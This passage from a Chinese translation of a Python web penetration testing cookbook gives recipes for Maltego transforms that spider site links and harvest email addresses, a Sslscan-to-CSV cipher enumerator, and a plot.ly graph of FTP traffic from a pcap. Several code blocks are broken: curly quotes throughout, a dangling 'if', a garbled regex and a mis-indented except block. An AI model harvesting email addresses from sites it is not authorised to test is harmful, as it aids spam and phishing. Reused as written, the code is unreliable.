from bs4 import BeautifulSoup
```

这样，当我们使用`BeautifulSoup`时，我们只需输入`BeautifulSoup`，而不是`bs4.BeautifulSoup`。

然后，我们将提供的目标 URL 分配给一个变量：

```py
tarurl = sys.argv[1]
```

完成后，我们检查目标 URL 是否以`/`结尾。如果是，则通过用`tarurl`变量替换`tarurl`的最后一个字符之外的所有字符，以便在配方中输出完整的相对链接时可以稍后使用：

```py
if tarurl[-1] == “/”:
  tarurl = tarurl[:-1]
```

然后，我们打印出构成 Maltego 变换响应的标签：

```py
print”<MaltegoMessage>”
print”<MaltegoTransformResponseMessage>”
print”  <Entities>”
```

然后，我们使用`urllib2`打开目标`url`并将其存储在`BeautifulSoup`中：

```py
url = urllib2.urlopen(tarurl).read()
soup = BeautifulSoup(url)
```

我们现在使用 soup 来查找所有`<a>`标签。更具体地说，我们将寻找具有超文本引用（链接）的`<a>`标签：

```py
for line in soup.find_all(‘a’):
  newline = line.get(‘href’)
```

如果链接的前四个字符是`http`，我们将其输出为 Maltego 的实体的正确格式：

```py
if newline[:4] == “http”:
    print”<Entity Type=\”maltego.Domain\”>”
    print”<Value>”+str(newline)+”</Value>”
    print”</Entity>”
```

如果第一个字符是`/`，表示链接是相对链接，那么我们将在将目标 URL 添加到链接之后将其输出到正确的格式。虽然这个配方展示了如何处理相对链接的一个示例，但重要的是要注意，还有其他类型的相对链接，比如只是一个文件名（`example.php`），一个目录，以及相对路径点符号（`../../example.php`），如下所示：

```py
elif newline[:1] == “/”:
    combline = tarurl+newline
    if 
    print”<Entity Type=\”maltego.Domain\”>”
    print”<Value>”+str(combline)+”</Value>”
    print”</Entity>”
```

在我们处理页面上的所有链接之后，我们关闭了输出开始时打开的所有标签：

```py
print”  </Entities>”
print”</MaltegoTransformResponseMessage>”
print”</MaltegoMessage>”
```

## 还有更多…

`BeautifulSoup`库包含其他可以使您的代码更简单的函数。其中一个函数叫做**SoupStrainer**。SoupStrainer 允许您仅解析您想要的文档部分。我们留下这个作为一个让您探索的练习。

# 将电子邮件提取到 Maltego

本书中还有另一个配方，说明了如何从网站中提取电子邮件。这个配方将向您展示如何创建一个本地的 Maltego 变换，然后您可以在 Maltego 本身中使用它来生成信息。它可以与 URL 蜘蛛变换一起使用，从整个网站中提取电子邮件。

## 如何做…

以下代码显示了如何通过使用正则表达式从网站中提取电子邮件：

```py
import urllib2
import re
import sys

tarurl = sys.argv[1]
url = urllib2.urlopen(tarurl).read()
regex = re.compile((“([a-z0-9!#$%&’*+\/=?^_`{|}~- ]+(?:\.[*+\/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&’*+\/=?^_`” “{|}~- ]+)*(@|\sat\s)(?:a-z0-9?(\.|” “\ sdot\s))+a-z0-9?)”))

print”<MaltegoMessage>”
print”<MaltegoTransformResponseMessage>”
print”  <Entities>”
emails = re.findall(regex, url)
for email in emails:
  print”    <Entity Type=\”maltego.EmailAddress\”>”
  print”      <Value>”+str(email[0])+”</Value>”
  print”    </Entity>”
print”  </Entities>”
print”</MaltegoTransformResponseMessage>”
print”</MaltegoMessage>”
```

## 它是如何工作的…

脚本的顶部导入了必要的模块。之后，我们将提供的 URL 分配为一个变量，并使用`urllib2`打开`url`列表：

```py
tarurl = sys.argv[1]
url = urllib2.urlopen(tarurl).read()
```

然后，我们创建一个匹配标准电子邮件地址格式的正则表达式：

```py
regex = re.compile((“([a-z0-9!#$%&’*+\/=?^_`{|}~-]+(?:\.[a-z0- 9!#$%&’*+\/=?^_`” “{|}~-]+)*(@|\sat\s)(?:a-z0-9?(\.|” “\sdot\s))+a-z0-9?)”))
```

前面的正则表达式应匹配格式为`email@address.com`或电子邮件在地址点 com 中的电子邮件地址。

然后，我们输出了一个有效的 Maltego 变换输出所需的标签：

```py
print”<MaltegoMessage>”
print”<MaltegoTransformResponseMessage>”
print”  <Entities>”
```

然后，我们找到`url`内容中与我们的正则表达式匹配的所有文本实例：

```py
emails = re.findall(regex, url)
```

然后，我们找到我们找到的每个电子邮件地址，并以正确的格式输出到 Maltego 变换响应中：

```py
for email in emails:
  print”    <Entity Type=\”maltego.EmailAddress\”>”
  print”      <Value>”+str(email[0])+”</Value>”
  print”    </Entity>”
```

然后，我们关闭了之前打开的标签：

```py
print”  </Entities>”
print”</MaltegoTransformResponseMessage>”
print”</MaltegoMessage>”
```

# 将 Sslscan 解析为 CSV

Sslscan 是一种用于枚举 HTTPS 站点支持的密码的工具。了解站点支持的密码对 Web 应用程序测试很有用。如果一些支持的密码较弱，这在渗透测试中更有用。

## 如何做…

这个配方将在指定的 IP 地址上运行 Sslscan，并将结果输出为 CSV 格式：

```py
import subprocess
import sys

ipfile = sys.argv[1]

IPs = open(ipfile, “r”)
output = open(“sslscan.csv”, “w+”)

for IP in IPs:
  try:
    command = “sslscan “+IP

    ciphers = subprocess.check_output(command.split())

    for line in ciphers.splitlines():
      if “Accepted” in line:
        output.write(IP+”,”+line.split()[1]+”,”+ line.split()[4]+”,”+line.split()[2]+”\r”)
  except:
    pass
```

## 它是如何工作的…

我们首先导入必要的模块，并将参数中提供的文件名分配给一个变量：

```py
import subprocess
import sys

ipfile = sys.argv[1]
```

提供的文件名应指向包含 IP 地址列表的文件。我们以只读方式打开此文件：

```py
IPs = open(ipfile, “r”)
```

然后，我们打开一个文件以进行读取和写入输出，而不是使用`r`：

```py
output = open(“sslscan.csv”, “w+”)
```

现在我们有了输入和写输出的地方，我们已经准备好了。我们首先通过 IP 地址进行迭代：

```py
for IP in IPs:
```

对于每个 IP，我们运行 Sslscan：

```py
  try:
    command = “sslscan “+IP
```

然后我们将命令的输出分成几块：

```py
    ciphers = subprocess.check_output(command.split())
```

然后我们逐行查看输出。如果行包含`Accepted`这个词，那么我们会为 CSV 输出排列行的元素：

```py
    for line in ciphers.splitlines():
      if “Accepted” in line:
        output.write(IP+”,”+line.split()[1]+”,”+ line.split()[4]+”,”+line.split()[2]+”\r”)
```

最后，如果由于任何原因尝试对 IP 运行 SSL 扫描失败，我们只需继续下一个 IP 地址：

```py
  except:
  pass
```

# 使用 plot.ly 生成图表

有时候有一个数据的可视化表示真的很好。在这个示例中，我们将使用`plot.ly` python API 来生成一个漂亮的图表。

## 准备就绪

在这个示例中，我们将使用`plot.ly` API 来生成我们的图表。如果您还没有账户，您需要在[`plot.ly`](https://plot.ly)注册一个账户。

一旦您有了账户，您就需要准备好使用`plot.ly`的环境。

最简单的方法是使用`pip`来安装它，所以只需运行以下命令：

```py
$ pip install plotly

```

然后，您需要运行以下命令（用您自己的用户名、API 密钥和流 ID 替换`{username}`、`{apikey}`和`{streamids}`，这些信息可以在`plot.ly`网站的账户订阅下查看）：

```py
python -c “import plotly;  plotly.tools.set_credentials_file(username=’{username}’,  api_key=’{apikey}’, stream_ids=[{streamids}])”

```

如果您正在按照这个示例进行操作，我使用的是在线测试的`pcap`文件：[`www.snaketrap.co.uk/pcaps/hbot.pcap`](http://www.snaketrap.co.uk/pcaps/hbot.pcap)。

我们将枚举`pcap`文件中的所有 FTP 数据包，并将它们根据时间绘制出来。

为了解析`pcap`文件，我们将使用`dpkt`模块。就像之前的示例中使用的`Scapy`一样，`dpkt`可以用来解析和操作数据包。

最简单的方法是使用`pip`来安装它。只需运行以下命令：

```py
$ pip install dpkt

```

## 如何做…

这个示例将读取一个`pcap`文件，并提取任何 FTP 数据包的日期和时间，然后将这些数据绘制成图表：

```py
import time, dpkt
import plotly.plotly as py
from plotly.graph_objs import *
from datetime import datetime

filename = ‘hbot.pcap’

full_datetime_list = []
dates = []

for ts, pkt in dpkt.pcap.Reader(open(filename,’rb’)):
    eth=dpkt.ethernet.Ethernet(pkt) 
    if eth.type!=dpkt.ethernet.ETH_TYPE_IP:
        continue

    ip = eth.data
    tcp=ip.data

    if ip.p not in (dpkt.ip.IP_PROTO_TCP, dpkt.ip.IP_PROTO_UDP):
        continue

    if tcp.dport == 21 or tcp.sport == 21:
        full_datetime_list.append((ts, str(time.ctime(ts))))

for t,d in full_datetime_list:
    if d not in dates:
        dates.append(d)

dates.sort(key=lambda date: datetime.strptime(date, “%a %b %d %H:%M:%S %Y”))

datecount = []

for d in dates:
    counter = 0
    for d1 in full_datetime_list:
        if d1[1] == d:
            counter += 1

    datecount.append(counter)

data = Data([
    Scatter(
        x=dates,
        y=datecount
    )
])
plot_url = py.plot(data, filename=’FTP Requests’)
```

## 工作原理…

我们首先导入必要的模块，并将我们的`pcap`文件的文件名分配给一个变量：

```py
import time, dpkt
import plotly.plotly as py
from plotly.graph_objs import *
from datetime import datetime

filename = ‘hbot.pcap’
```

接下来，我们设置我们将在迭代`pcap`文件时填充的列表。`Full_datetime_list`变量将保存所有 FTP 数据包的日期，而`dates`将用于保存完整列表中唯一的`datetime`：

```py
full_datetime_list = []
dates = []
```

然后我们打开`pcap`文件进行读取，并在`for`循环中迭代。这一部分检查数据包是否是 FTP 数据包，如果是，然后将时间追加到我们的数组中：

```py
for ts, pkt in dpkt.pcap.Reader(open(filename,’rb’)):
    eth=dpkt.ethernet.Ethernet(pkt) 
    if eth.type!=dpkt.ethernet.ETH_TYPE_IP:
        continue

    ip = eth.data
    tcp=ip.data

    if ip.p not in (dpkt.ip.IP_PROTO_TCP, dpkt.ip.IP_PROTO_UDP):
        continue

    if tcp.dport == 21 or tcp.sport == 21:
        full_datetime_list.append((ts, str(time.ctime(ts))))
```

现在我们有了 FTP 流量的`datetime`函数列表，我们可以从中获取唯一的`datetime`函数，并填充我们的`dates`数组：

```py
for t,d in full_datetime_list:
    if d not in dates:
        dates.append(d)
```

然后我们对日期进行排序，以便它们在我们的图表上按顺序排列：

```py
dates.sort(key=lambda date: datetime.strptime(date, “%a %b %d H:%M:%S %Y”))
```

然后，我们只需迭代唯一的日期，并计算在那个时间段内从我们的较大数组中发送/接收的所有数据包，并填充我们的计数器数组：

```py
datecount = []

for d in dates:
    counter = 0
    for d1 in full_datetime_list:
        if d1[1] == d:
            counter += 1

    datecount.append(counter)
```

剩下要做的就是通过 API 调用`plot.ly`，使用我们的日期数组和计数数组作为数据点：

```py
data = Data([
    Scatter(
        x=dates,
        y=datecount
    )
])
plot_url = py.plot(data, filename=’FTP Requests’)
```

当您运行脚本时，它应该会弹出浏览器到您新创建的`plot.ly`图表，如下所示：

![工作原理…](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-web-pentest-cb/img/B04044_09_01.jpg)

就是这样。`plot.ly`有很多不同的方法来可视化您的数据，值得花点时间去尝试一下。想象一下当老板看到您发送给他们的漂亮图表时会有多么印象深刻。
